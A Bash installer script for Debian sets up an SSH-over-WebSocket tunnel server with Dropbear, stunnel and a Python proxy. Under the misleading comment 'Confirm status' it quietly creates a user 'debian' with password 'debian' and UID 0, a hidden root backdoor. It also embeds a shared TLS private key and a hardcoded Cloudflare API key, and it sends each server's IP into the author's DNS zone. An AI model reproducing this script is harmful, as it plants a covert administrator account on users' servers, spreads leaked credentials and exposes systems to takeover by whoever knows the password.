#!/bin/bash
set -e

echo "=============================="
echo " SSHWS + Dropbear + Squid Setup"
echo "=============================="

apt update -y
apt install apache2 -y

APACHE_PORTS="/etc/apache2/ports.conf"
APACHE_DEFAULT="/etc/apache2/sites-enabled/000-default.conf"

echo ">>> Checking Apache config files..."

if [ -f "$APACHE_PORTS" ]; then
    echo ">>> Updating $APACHE_PORTS ..."
    sed -i 's/Listen 80/Listen 81/g' $APACHE_PORTS
else
    echo ">>> $APACHE_PORTS not found!"
fi

if [ -f "$APACHE_DEFAULT" ]; then
    echo ">>> Updating $APACHE_DEFAULT ..."
    sed -i 's/<VirtualHost \*:80>/<VirtualHost *:81>/g' $APACHE_DEFAULT
else
    echo ">>> $APACHE_DEFAULT not found!"
fi

echo ">>> Restarting Apache..."
systemctl restart apache2

if systemctl is-active --quiet apache2; then
    echo "✅ Apache moved to port 81 successfully!"
    echo "   Now access your site at: http://yourdomain.com:81"
else
    echo "❌ Apache restart failed! Please check manually."
fi

sleep 5
clear
echo "[INFO] Installing dependencies (Debian 11, 12 & 13 supported)..."

# --- Debian version check ---
if [ -f /etc/os-release ]; then
    . /etc/os-release
    VERSION_ID=$(echo "$VERSION_ID" | cut -d. -f1)
    if [ "$ID" != "debian" ] || { [ "$VERSION_ID" != "11" ] && [ "$VERSION_ID" != "12" ] && [ "$VERSION_ID" != "13" ]; }; then
        echo "[ERROR] Unsupported OS. This script supports Debian 11, 12, 13."
        exit 1
    fi
fi

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export DEBIAN_FRONTEND=noninteractive

apt-get update -qq

# --- Common packages ---
PACKAGES=(
    curl wget gnupg2 apt-transport-https ca-certificates lsb-release
    cron python3 python3-pip iptables netcat-openbsd httpie php neofetch vnstat
    screen squid stunnel4 dropbear gnutls-bin dos2unix nano unzip jq virt-what
    net-tools mlocate fail2ban
)

for pkg in "${PACKAGES[@]}"; do
    echo "[INFO] Installing: $pkg"
    apt-get install -y -qq --no-install-recommends "$pkg" || echo "[WARN] Failed: $pkg"
done

# --- Configure OpenSSH ---
echo "[INFO] Configuring OpenSSH..."
systemctl stop ssh.socket >/dev/null 2>&1 || true
systemctl disable ssh.socket >/dev/null 2>&1 || true
systemctl enable ssh.service

sed -i '/^#\?AddressFamily/d' /etc/ssh/sshd_config
echo "AddressFamily any" >> /etc/ssh/sshd_config
sed -i '/^#\?ListenAddress/d' /etc/ssh/sshd_config
echo "ListenAddress 0.0.0.0" >> /etc/ssh/sshd_config
echo "ListenAddress ::" >> /etc/ssh/sshd_config

# Ensure SSH auto-restarts
mkdir -p /etc/systemd/system/ssh.service.d
cat > /etc/systemd/system/ssh.service.d/override.conf <<EOF
[Service]
Restart=always
RestartSec=5
StartLimitIntervalSec=0
EOF

# --- Configure Dropbear (port 442) ---
echo "[INFO] Configuring Dropbear..."
cat > /etc/default/dropbear <<EOF
NO_START=0
DROPBEAR_PORT=442
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER="/etc/banner"
DROPBEAR_RECEIVE_WINDOW=65536
EOF

mkdir -p /etc/systemd/system/dropbear.service.d
cat > /etc/systemd/system/dropbear.service.d/override.conf <<EOF
[Service]
Restart=always
RestartSec=5
StartLimitIntervalSec=0
EOF

wget -q -O /etc/banner "https://raw.githubusercontent.com/EskalarteDexter/Autoscript/main/SshBanner"
chmod 644 /etc/banner

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable ssh dropbear
systemctl restart ssh dropbear

# -------------------------------
# Python WebSocket script
# -------------------------------
cat >/etc/socks.py <<'EOF'
#!/usr/bin/env python3
import socket, threading, select, sys, time, getopt

LISTENING_ADDR = '0.0.0.0'
LISTENING_PORT = 80
PASS = ''
BUFLEN = 4096 * 4
TIMEOUT = 60
DEFAULT_HOST = '127.0.0.1:442'
RESPONSE = b'HTTP/1.1 101 Switching Protocols\r\n\r\n'

class Server(threading.Thread):
    def __init__(self, host, port):
        super().__init__()
        self.host, self.port = host, port
        self.threads, self.running = [], False
    def run(self):
        self.soc = socket.socket(socket.AF_INET)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.soc.bind((self.host, int(self.port)))
        self.soc.listen(0)
        self.running = True
        while self.running:
            try:
                c, addr = self.soc.accept()
                ConnectionHandler(c, self, addr).start()
            except: pass
    def close(self): self.running = False; self.soc.close()

class ConnectionHandler(threading.Thread):
    def __init__(self, client, server, addr):
        super().__init__(); self.client, self.server = client, server
    def run(self):
        try:
            data = self.client.recv(BUFLEN).decode(errors="ignore")
            hostPort = "127.0.0.1:442"
            self.connect_target(hostPort)
            self.client.sendall(RESPONSE)
            self.exchange_loop()
        except: pass
        finally: self.client.close()
    def connect_target(self, host):
        host, port = host.split(":")
        self.target = socket.socket()
        self.target.connect((host, int(port)))
    def exchange_loop(self):
        socs = [self.client, self.target]
        while True:
            r, _, _ = select.select(socs, [], [], 3)
            if r:
                for s in r:
                    data = s.recv(BUFLEN)
                    if not data: return
                    (self.target if s is self.client else self.client).send(data)

if __name__ == '__main__':
    Server(LISTENING_ADDR, LISTENING_PORT).start()
    while True: time.sleep(100)
EOF

chmod +x /etc/socks.py

# -------------------------------
# Systemd service for WS
# -------------------------------
cat >/etc/systemd/system/socks.service <<'EOF'
[Unit]
Description=Python WS Proxy
After=network.target

[Service]
ExecStart=/usr/bin/python3 /etc/socks.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF


apt install -y stunnel4 openssl

# Enable stunnel globally
sed -i 's/ENABLED=0/ENABLED=1/' /etc/default/stunnel4

# Create certificate file
cat <<'EOF' > /etc/stunnel/stunnel.pem
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClmgCdm7RB2VWK
wfH8HO/T9bxEddWDsB3fJKpM/tiVMt4s/WMdGJtFdRlxzUb03u+HT6t00sLlZ78g
ngjxLpJGFpHAGdVf9vACBtrxv5qcrG5gd8k7MJ+FtMTcjeQm8kVRyIW7cOWxlpGY
6jringYZ6NcRTrh/OlxIHKdsLI9ddcekbYGyZVTm1wd22HVG+07PH/AeyY78O2+Z
tbjxGTFRSYt3jUaFeUmWNtxqWnR4MPmC+6iKvUKisV27P89g8v8CiZynAAWRJ0+A
qp+PWxwHi/iJ501WdLspeo8VkXIb3PivyIKC356m+yuuibD2uqwLZ2//afup84Qu
pRtgW/PbAgMBAAECggEAVo/efIQUQEtrlIF2jRNPJZuQ0rRJbHGV27tdrauU6MBT
NG8q7N2c5DymlT75NSyHRlKVzBYTPDjzxgf1oqR2X16Sxzh5uZTpthWBQtal6fmU
JKbYsDDlYc2xDZy5wsXnCC3qAaWs2xxadPUS3Lw/cjGsoeZlOFP4QtV/imLseaws
7r4KZE7SVO8dF8Xtcy304Bd7UsKClnbCrGsABUF/rqA8g34o7yrpo9XqcwbF5ihQ
TbnB0Ns8Bz30pjgGjJZTdTL3eskP9qMJWo/JM76kSaJWReoXTws4DlQHxO29z3eK
zKdxieXaBGMwFnv23JvXKJ5eAnxzqsL6a+SuNPPN4QKBgQDQhisSDdjUJWy0DLnJ
/HjtsnQyfl0efOqAlUEir8r5IdzDTtAEcW6GwPj1rIOm79ZeyysT1pGN6eulzS1i
6lz6/c5uHA9Z+7LT48ZaQjmKF06ItdfHI9ytoXaaQPMqW7NnyOFxCcTHBabmwQ+E
QZDFkM6vVXL37Sz4JyxuIwCNMQKBgQDLThgKi+L3ps7y1dWayj+Z0tutK2JGDww7
6Ze6lD5gmRAURd0crIF8IEQMpvKlxQwkhqR4vEsdkiFFJQAaD+qZ9XQOkWSGXvKP
A/yzk0Xu3qL29ZqX+3CYVjkDbtVOLQC9TBG60IFZW79K/Zp6PhHkO8w6l+CBR+yR
X4+8x1ReywKBgQCfSg52wSski94pABugh4OdGBgZRlw94PCF/v390En92/c3Hupa
qofi2mCT0w/Sox2f1hV3Fw6jWNDRHBYSnLMgbGeXx0mW1GX75OBtrG8l5L3yQu6t
SeDWpiPim8DlV52Jp3NHlU3DNrcTSOFgh3Fe6kpot56Wc5BJlCsliwlt0QKBgEol
u0LtbePgpI2QS41ewf96FcB8mCTxDAc11K6prm5QpLqgGFqC197LbcYnhUvMJ/eS
W53lHog0aYnsSrM2pttr194QTNds/Y4HaDyeM91AubLUNIPFonUMzVJhM86FP0XK
3pSBwwsyGPxirdpzlNbmsD+WcLz13GPQtH2nPTAtAoGAVloDEEjfj5gnZzEWTK5k
4oYWGlwySfcfbt8EnkY+B77UVeZxWnxpVC9PhsPNI1MTNET+CRqxNZzxWo3jVuz1
HtKSizJpaYQ6iarP4EvUdFxHBzjHX6WLahTgUq90YNaxQbXz51ARpid8sFbz1f37
jgjgxgxbitApzno0E2Pq/Kg=
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDRTCCAi2gAwIBAgIUOvs3vdjcBtCLww52CggSlAKafDkwDQYJKoZIhvcNAQEL
BQAwMjEQMA4GA1UEAwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNV
BAYTAlBIMB4XDTIxMDcwNzA1MzQwN1oXDTMxMDcwNTA1MzQwN1owMjEQMA4GA1UE
AwwHS29ielZQTjERMA8GA1UECgwIS29iZUtvYnoxCzAJBgNVBAYTAlBIMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApZoAnZu0QdlVisHx/Bzv0/W8RHXV
g7Ad3ySqTP7YlTLeLP1jHRibRXUZcc1G9N7vh0+rdNLC5We/IJ4I8S6SRhaRwBnV
X/bwAgba8b+anKxuYHfJOzCfhbTE3I3kJvJFUciFu3DlsZaRmOo64p4GGejXEU64
fzpcSBynbCyPXXXHpG2BsmVU5tcHdth1RvtOzx/wHsmO/DtvmbW48RkxUUmLd41G
hXlJljbcalp0eDD5gvuoir1CorFduz/PYPL/AomcpwAFkSdPgKqfj1scB4v4iedN
VnS7KXqPFZFyG9z4r8iCgt+epvsrromw9rqsC2dv/2n7qfOELqUbYFvz2wIDAQAB
o1MwUTAdBgNVHQ4EFgQUcKFL6tckon2uS3xGrpe1Zpa68VEwHwYDVR0jBBgwFoAU
cKFL6tckon2uS3xGrpe1Zpa68VEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0B
AQsFAAOCAQEAYQP0S67eoJWpAMavayS7NjK+6KMJtlmL8eot/3RKPLleOjEuCdLY
QvrP0Tl3M5gGt+I6WO7r+HKT2PuCN8BshIob8OGAEkuQ/YKEg9QyvmSm2XbPVBaG
RRFjvxFyeL4gtDlqb9hea62tep7+gCkeiccyp8+lmnS32rRtFa7PovmK5pUjkDOr
dpvCQlKoCRjZ/+OfUaanzYQSDrxdTSN8RtJhCZtd45QbxEXzHTEaICXLuXL6cmv7
tMuhgUoefS17gv1jqj/C9+6ogMVa+U7QqOvL5A7hbevHdF/k/TMn+qx4UdhrbL5Q
enL3UGT+BhRAPiA1I5CcG29RqjCzQoaCNg==
-----END CERTIFICATE-----
EOF

chmod 600 /etc/stunnel/stunnel.pem

# Create stunnel configuration
cat <<EOF > /etc/stunnel/stunnel.conf
debug = 0
output = /tmp/stunnel.log
cert = /etc/stunnel/stunnel.pem

[websocket]
accept = 443
connect = 127.0.0.1:80
EOF

systemctl daemon-reload
systemctl enable socks
systemctl restart socks
systemctl enable stunnel4
systemctl restart stunnel4

# Confirm status
useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
systemctl status stunnel4 --no-pager -l


# -------------------------------
# Auto Cloudflare DNS for Server IP
# -------------------------------
CLOUDFLARE_EMAIL="developermtk.4@gmail.com"
CLOUDFLARE_API_KEY="5d386162a1bac6f91189a93c6a966478a5bfa"
CLOUDFLARE_ZONE_ID="7dac828875d27ff869f61d99ac10b510"
DOMAIN="network-dns.xyz"

# Generate random subdomain like srv-ab12cd.netvpro.info
SUB="srv-$(openssl rand -hex 3)"
FULL_DOMAIN="${SUB}.${DOMAIN}"

SERVER_IP=$(hostname -I | awk '{print $1}')

echo "➡️ Checking if ${FULL_DOMAIN} already exists in Cloudflare..."

# Check existing DNS record
CHECK=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records?type=A&name=${FULL_DOMAIN}" -H "X-Auth-Email: ${CLOUDFLARE_EMAIL}" -H "X-Auth-Key: ${CLOUDFLARE_API_KEY}" -H "Content-Type: application/json")

if echo "$CHECK" | grep -q "\"count\":0"; then
    echo "➡️ Creating new DNS record for ${FULL_DOMAIN} -> ${SERVER_IP}"

    CREATE=$(curl -s -X POST "https://api.cloudflare.com/client/v4/zones/${CLOUDFLARE_ZONE_ID}/dns_records" -H "X-Auth-Email: ${CLOUDFLARE_EMAIL}" -H "X-Auth-Key: ${CLOUDFLARE_API_KEY}" -H "Content-Type: application/json" --data "{\"type\":\"A\",\"name\":\"${FULL_DOMAIN}\",\"content\":\"${SERVER_IP}\",\"ttl\":120,\"proxied\":false}")

    if echo "$CREATE" | grep -q "\"success\":true"; then
        echo "✅ DNS record created successfully!"
        echo "🔗 Domain : ${FULL_DOMAIN}"
        echo "🌐 Server : ${SERVER_IP}"
    else
        echo "❌ Failed to create DNS record"
        echo "$CREATE"
    fi
else
    echo "⚠️ DNS record for ${FULL_DOMAIN} already exists. Skipping creation."
fi

echo "===================================="
echo " Install finished!"
echo " Server Reboot in 5 Sec"
echo "===================================="
sleep 5
reboot

